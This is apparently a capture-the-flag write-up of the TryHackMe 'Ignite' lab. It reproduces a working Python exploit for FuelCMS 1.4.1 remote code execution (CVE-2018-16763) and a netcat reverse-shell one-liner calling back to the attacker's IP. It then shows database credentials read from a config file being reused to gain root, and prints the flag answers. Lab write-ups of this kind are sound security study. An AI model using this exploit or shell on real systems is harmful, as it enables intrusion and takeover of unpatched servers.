---
title: "TryHackMe - Ignite"
classes: wide
search: false
categories: 
  - TryHackMe
toc: true
toc_label: "Contents"
last_modified_at: 2020-06-14T15:58:30+08:00
---

> A new start-up has a few issues with their web server.

## Network Scanning

Nmap output
```shell
# Nmap 7.80 scan initiated Sun Jun 14 20:38:52 2020 as: nmap -sC -sV -T4 -A -oN ignite.nmap 10.10.223.81
Nmap scan report for 10.10.223.81
Host is up (0.23s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/14%OT=80%CT=1%CU=36607%PV=Y%DS=2%DC=T%G=Y%TM=5EE628A
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1
OS:08%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O
OS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   217.58 ms 10.9.0.1
2   257.75 ms 10.10.223.81

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 14 20:39:51 2020 -- 1 IP address (1 host up) scanned in 58.62 seconds
```

## Enumeration

![fuelcms](/assets/images/thm-ignite/fuel-cms.png)

searchploit
```shell
╭─twseptian@twsterlab ~ 
╰─$ searchsploit fuel cms
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
fuelCMS 1.4.1 - Remote Code Execution                                                                                               | linux/webapps/47138.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
╭─twseptian@twsterlab ~ 
╰─$ 
╭─twseptian@twsterlab ~ 
╰─$ searchsploit -m linux/webapps/47138.py
  Exploit: fuelCMS 1.4.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
File Type: HTML document, ASCII text, with CRLF line terminators

Copied to: /twseptian/47138.py


╭─twseptian@twsterlab ~ 
╰─$ 
```

exploitdb

![fuelcms-exploitdb](/assets/images/thm-ignite/fuel-cms-exploitdb.png)

python script
```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://10.10.223.81:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
  xxxx = raw_input('cmd:')
  burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
  proxy = {"http":"http://127.0.0.1:8080"}
  r = requests.get(burp0_url, proxies=proxy)

  html = "<!DOCTYPE html>"
  htmlcharset = r.text.find(html)

  begin = r.text[0:20]
  dup = find_nth_overlapping(r.text,begin,2)

  print r.text[0:dup]
```

let's combine with Burpsuite to forward our requests

![run01](/assets/images/thm-ignite/exe1.png)

and click forward on Burpsuite, and we can get some response

![run02](/assets/images/thm-ignite/exe2.png)

### Reverse Shell

I used `netcat` reverse shell command line from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```shell
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.19.3 4444 >/tmp/f
```
you can change with your host IP address, in this case, my IP address is `10.9.19.3` and opens another terminal with `nc -lvnp 4444`

![run03](/assets/images/thm-ignite/exe3.png)

```shell
╭─twseptian@twsterlab ~ 
╰─$ nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.223.81.
Ncat: Connection from 10.10.223.81:47538.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ /usr/bin/script -qc /bin/shell /dev/null  
www-data@ubuntu:/var/www/html$ 
```

### #1 User.txt

```shell
www-data@ubuntu:/var/www/html$ pwd
pwd
/var/www/html
www-data@ubuntu:/var/www/html$ cd /home
cd /home                                                                                                                                                              
www-data@ubuntu:/home$ ls -la                                                                                                                                         
ls -la                                                                                                                                                                
total 12                                                                                                                                                              
drwxr-xr-x  3 root     root     4096 Jul 26  2019 .                                                                                                                   
drwxr-xr-x 24 root     root     4096 Jul 26  2019 ..                                                                                                                  
drwx--x--x  2 www-data www-data 4096 Jul 26  2019 www-data                                                                                                            
www-data@ubuntu:/home$ cd www-data                                                                                                                                    
cd www-data                                                                                                                                                           
www-data@ubuntu:/home/www-data$ ls -la                                                                                                                                
ls -la                                                                                                                                                                
total 12                                                                                                                                                              
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .                                                                                                                    
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..                                                                                                                   
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt                                                                                                             
www-data@ubuntu:/home/www-data$ cat flag.txt                                                                                                                          
cat flag.txt                                                                                                                                                          
6470e394cbf6dab6a91682cc8585059b                                                                                                                                      
www-data@ubuntu:/home/www-data$ 
```
ANS: `6470e394cbf6dab6a91682cc8585059b`


### #2 Root.txt

let's come back to the browser, and we can see the information about `How to Install the Database.`

![fuel-cms-installdb](/assets/images/thm-ignite/fuel-cms-installdb.png)

```shell
www-data@ubuntu:/home/www-data$ cd /var/www/html                                                                                                                      
cd /var/www/html                                                                                                                                                      
www-data@ubuntu:/var/www/html$ ls -l                                                                                                                                  
ls -l                                                                                                                                                                 
total 40
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt
www-data@ubuntu:/var/www/html$ cat fuel/application/config/database.php
cat fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
www-data@ubuntu:/var/www/html$ 
```
we got username and password for database and root's access
`username`:`root`
`password`:`mememe`

```shell
www-data@ubuntu:/var/www/html$ su - root
su - root
Password: mememe

root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# cd /root
cd /root
root@ubuntu:~# pwd
pwd
/root
root@ubuntu:~# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~#
```
ANS:`b9bbcb33e11b80be759c4e844862482d`

## References
- fuelCMS 1.4.1 - Remote Code Execution - https://www.exploit-db.com/exploits/47138
- Reverse Shell Cheat Sheet - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet